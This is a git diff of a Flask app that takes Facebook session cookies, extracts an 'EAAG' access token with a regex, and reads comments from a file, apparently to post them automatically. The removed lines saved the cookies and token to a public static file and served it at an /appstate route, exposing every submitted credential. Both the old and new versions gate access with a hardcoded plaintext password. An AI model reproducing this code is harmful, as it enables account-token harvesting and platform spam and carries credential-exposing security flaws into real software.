@@ -1,12 +1,10 @@
-from flask import Flask, render_template, request, redirect, url_for, send_file
+from flask import Flask, render_template, request, redirect, url_for
 import requests
 import re
 import time
 import os
-import json
 
 app = Flask(__name__)
-app.debug = True
 
 def make_request(url, headers, cookies):
     try:
@@ -18,9 +16,8 @@ def make_request(url, headers, cookies):
 @app.route('/', methods=['GET', 'POST'])
 def index():
     if request.method == 'POST':
-        username = request.form['username']
         password = request.form['password']
-        if username == 'HENRY' and password == 'HENRY 786':
+        if password == "Devil 789":
             return redirect(url_for('dashboard'))
         else:
             return render_template('index.html', error="Incorrect Password! Try again.")
@@ -49,16 +46,6 @@ def dashboard():
             token_eaag = re.search('(EAAG\w+)', str(response)).group(1)
         except AttributeError:
             return render_template('dashboard.html', error="Token not found in response")
-
-        # Convert cookies to appstate format
-        appstate = {
-            'cookies': cookies,
-            'access_token': token_eaag
-        }
-
-        # Save appstate to appstate.js file
-        with open('static/appstate.js', 'w') as file:
-            file.write(f"const appState = {json.dumps(appstate, indent=4)};\n")
 
         with open(comment_file_path, 'r') as file:
             comments = file.readlines()
@@ -101,11 +88,6 @@ def dashboard():
 
     return render_template('dashboard.html')
 
-@app.route('/appstate')
-def serve_appstate():
-    return send_file('static/appstate.js')
-
 if __name__ == '__main__':
     os.makedirs('uploads', exist_ok=True)
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=True)
+    app.run(host='0.0.0.0', port=5000)
